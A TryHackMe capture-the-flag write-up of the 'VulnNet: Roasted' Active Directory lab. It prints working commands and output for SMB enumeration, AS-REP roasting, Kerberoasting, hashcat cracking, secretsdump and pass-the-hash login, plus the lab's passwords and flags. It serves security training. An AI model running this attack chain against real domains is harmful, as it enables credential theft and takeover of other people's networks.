## VulnNet: Roasted - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/vulnnetroasted)

VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.

    Difficulty: Easy
    Operating System: Windows

This is a much simpler machine, do not overthink. You can do it by following common methodologies.

Note: It might take up to 6 minutes for this machine to fully boot.

Icon made by DinosoftLabs from www.flaticon.com

**IP: 10.10.205.21**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Windows Active Directory <br>

**Tools Used**: Nmap, Smbmap, Impacket, Hashcat<br>

[Impacket](https://github.com/fortra/impacket)<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap scan.

  ```
  nmap -sC -sV -T -p- 10.10.205.21

  PORT      STATE SERVICE       VERSION
  53/tcp    open  domain        Simple DNS Plus
  88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-19 20:36:30Z)
  135/tcp   open  msrpc         Microsoft Windows RPC
  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
  445/tcp   open  microsoft-ds?
  464/tcp   open  kpasswd5?
  593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  636/tcp   open  tcpwrapped
  3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
  3269/tcp  open  tcpwrapped
  5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-server-header: Microsoft-HTTPAPI/2.0
  |_http-title: Not Found
  9389/tcp  open  mc-nmf        .NET Message Framing
  49666/tcp open  msrpc         Microsoft Windows RPC
  49668/tcp open  msrpc         Microsoft Windows RPC
  49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  49674/tcp open  msrpc         Microsoft Windows RPC
  49677/tcp open  msrpc         Microsoft Windows RPC
  49707/tcp open  msrpc         Microsoft Windows RPC
  49814/tcp open  msrpc         Microsoft Windows RPC
  Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled and required
  | smb2-time: 
  |   date: 2025-05-19T20:37:21
  |_  start_date: N/A
  ```
  
- `enum4linux` found nothing so `smbmap` had to jump in action.

  ```
  smbmap -H 10.10.205.21 -u anonymous
  [+] IP: 10.10.205.21:445        Name: 10.10.205.21              Status: Authenticated
          Disk                                                    Permissions     Comment
          ----                                                    -----------     -------
          ADMIN$                                                  NO ACCESS       Remote Admin
          C$                                                      NO ACCESS       Default share
          IPC$                                                    READ ONLY       Remote IPC
          NETLOGON                                                NO ACCESS       Logon server share 
          SYSVOL                                                  NO ACCESS       Logon server share 
          VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
          VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
  ```

- Let's enumerate it even more with `lookupsid.py`.

  ```
  lookupsid.py anonymous@10.10.205.21
  Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
  
  Password:
  [*] Brute forcing SIDs at 10.10.205.21
  [*] StringBinding ncacn_np:10.10.205.21[\pipe\lsarpc]
  [*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
  500: VULNNET-RST\Administrator (SidTypeUser)
  501: VULNNET-RST\Guest (SidTypeUser)
  502: VULNNET-RST\krbtgt (SidTypeUser)
  512: VULNNET-RST\Domain Admins (SidTypeGroup)
  513: VULNNET-RST\Domain Users (SidTypeGroup)
  514: VULNNET-RST\Domain Guests (SidTypeGroup)
  515: VULNNET-RST\Domain Computers (SidTypeGroup)
  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
  518: VULNNET-RST\Schema Admins (SidTypeGroup)
  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
  525: VULNNET-RST\Protected Users (SidTypeGroup)
  526: VULNNET-RST\Key Admins (SidTypeGroup)
  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
  1105: VULNNET-RST\a-whitehat (SidTypeUser)
  1109: VULNNET-RST\t-skid (SidTypeUser)
  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
  1111: VULNNET-RST\j-leet (SidTypeUser)
  ```

- For password just press enter and put all `SidTypeUser` in a .txt file.

  ```
  cat users.txt 
  Administrator
  Guest
  krbtgt
  WIN-2BO8M1OE1M1$
  enterprise-core-vn
  a-whitehat
  t-skid
  j-goldenhand
  j-leet
  ```

- Now dump hashes with ASREPRoast.

  ```
  GetNPUsers.py 'VULNNET-RST/' -usersfile users.txt -no-pass -dc-ip 10.10.205.21
  Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
  
  DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
  [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
  [-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
  [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
  [-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
  [-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
  [-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
  $krb5asrep$23$t-skid@VULNNET-RST:a0869866fd0952373811b5951cfbf9ce$9240e66199f3df18550f7779b9ced88f8a204eaa56[SNIP!]f53791f64e1298036fe9de17c7b978f857
  [-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
  [-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
  ```

- Crack the newly found hash. You can find all codes on Hashcat examples.

  ```
  18200 	Kerberos 5, etype 23, AS-REP 	$krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$[SNIP!]

  hashcat -m 18200 skid.txt /rockyou.txt 
  
  $krb5asrep$23$t-skid@VULNNET-RST:a0869866fd09523738[SNIP!]:tj072889*
  ```

- Now let's do some Kerberoasting since these are credentials for Remote IPC.

  ```
  GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -outputfile kerberoast.hash -dc-ip 10.10.205.21
  Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
  
  ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
  ----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
  CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 19:45:09.913979  2021-03-13 23:41:17.987528             
  
  [-] CCache file is not found. Skipping...
  ```

- Crack the newly found hash.

  ```
  13100 	Kerberos 5, etype 23, TGS-REP 	$krb5tgs$23$*user$realm$test/spn*$63386d22d359fe4223030[SNIP!]

  hashcat -m 13100 kerberoast.hash /rockyou.txt
  
  $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$8eae41f87c718510a0308fe4b42f[SNIP!]:ry=ibfkfv,s6h,
  ```

---

## 🧍 User Privilege Escalation

- Connect to the target and get the first flag. You can use `rdesktop`, `xfreerdp3` or `evil-winrm`.

  ```
  evil-winrm -u enterprise-core-vn -p ry=ibfkfv,s6h, -i 10.10.205.21

  Evil-WinRM shell v3.7
                                          
  Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                          
  Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                          
  Info: Establishing connection to remote endpoint
  *Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> whoami
  vulnnet-rst\enterprise-core-vn
  *Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> dir
  
  *Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> dir
  
  
      Directory: C:\Users\enterprise-core-vn\Desktop
  
  
  Mode                LastWriteTime         Length Name
  ----                -------------         ------ ----
  -a----        3/13/2021   3:43 PM             39 user.txt
  
  
  *Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> cat user.txt
  THM{726b7c0baaac1455d05c827b5561f4ed}
  ```

- We can't do much here anymore, so log out and do more enumeration. Use `smbclient` to get access to share `NETLOGON` and download the file with passwords.

  ```
  smbclient \\\\10.10.205.21\\NETLOGON -U vulnnet-rst.local\\t-skid
  Password for [VULNNET-RST.LOCAL\t-skid]:
  Try "help" to get a list of possible commands.
  smb: \> pwd
  Current directory is \\10.10.205.21\NETLOGON\
  smb: \> ls
    .                                   D        0  Tue Mar 16 23:15:49 2021
    ..                                  D        0  Tue Mar 16 23:15:49 2021
    ResetPassword.vbs                   A     2821  Tue Mar 16 23:18:14 2021
  
                  8771839 blocks of size 4096. 4536085 blocks available
  smb: \> get ResetPassword.vbs 
  getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (3.7 KiloBytes/sec) (average 3.7 KiloBytes/sec)
  smb: \> exit
  
  mousepad ResetPassword.vbs
  
  Option Explicit
  
  Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
  Dim strUserDN, objUser, strPassword, strUserNTName
  
  ' Constants for the NameTranslate object.
  Const ADS_NAME_INITTYPE_GC = 3
  Const ADS_NAME_TYPE_NT4 = 3
  Const ADS_NAME_TYPE_1779 = 1
  
  If (Wscript.Arguments.Count <> 0) Then
      Wscript.Echo "Syntax Error. Correct syntax is:"
      Wscript.Echo "cscript ResetPassword.vbs"
      Wscript.Quit
  End If
  
  strUserNTName = "a-whitehat"
  strPassword = "bNdKVkjv3RR9ht"
  [SNIP!]
  ```

- Well, I used these credentials to get to system flag but couldn't read it but `smbmap` with them will do huge job.

  ```
  smbmap -H 10.10.205.21 -u a-whitehat -p bNdKVkjv3RR9ht

  [+] IP: 10.10.205.21:445        Name: 10.10.205.21              Status: ADMIN!!!   
          Disk                                                    Permissions     Comment
          ----                                                    -----------     -------
          ADMIN$                                                  READ, WRITE     Remote Admin
          C$                                                      READ, WRITE     Default share
          IPC$                                                    READ ONLY       Remote IPC
          NETLOGON                                                READ, WRITE     Logon server share 
          SYSVOL                                                  READ, WRITE     Logon server share 
          VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
          VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
  ```

- Compare this output with the output that we got when using `anonymous` as username and you'll see the difference.

---

## 👑 Root Privilege Escalation

- Perfect, now dump those hashes again and login as Administrator. After that just read the flag.

  ```
  secretsdump.py VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.205.21 

  [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
  [SNIP!]
  ```

  ```
  evil-winrm -i 10.10.205.21 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
                                        
  Evil-WinRM shell v3.7
                                          
  Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                          
  Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                          
  Info: Establishing connection to remote endpoint
  *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
  vulnnet-rst\administrator
  
  *Evil-WinRM* PS C:\Users\Administrator> cd Desktop
  *Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
  
  
      Directory: C:\Users\Administrator\Desktop
  
  
  Mode                LastWriteTime         Length Name
  ----                -------------         ------ ----
  -a----        3/13/2021   3:34 PM             39 system.txt
  
  
  *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat system.txt
  THM{16f45e3934293a57645f8d7bf71d8d4c}
  ```

---

## 🏁 Flags

- **User Flag**: `THM{726b7c0baaac1455d05c827b5561f4ed}`
- **System Flag**: `THM{16f45e3934293a57645f8d7bf71d8d4c}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting my way around impacket and AD.`

- What did I learn?
  `Learned so much about exploiting Active Directory.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
